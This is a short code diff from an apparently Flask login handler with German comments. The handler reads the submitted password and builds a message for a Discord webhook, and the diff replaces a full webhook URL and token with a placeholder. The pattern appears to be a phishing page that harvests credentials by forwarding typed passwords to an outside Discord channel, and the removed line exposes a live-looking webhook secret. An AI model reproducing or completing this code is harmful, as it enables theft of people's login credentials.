@@ -12,7 +12,7 @@ def login():
     password = request.form['password']
 
     # Hier kannst du deine Discord-Webhook-URL einfügen
-    webhook_url = 'https://discord.com/api/webhooks/1234139793085038662/W_rsN2n4irOC9h7usoy6xPio0D_J-dwyJSGfivCvh92GDLWuImHmeYsZ9OQXM8rznrFv'
+    webhook_url = 'My Webhook'
 
     # Daten für die Webhook-Nachricht zusammenstellen
     data = {
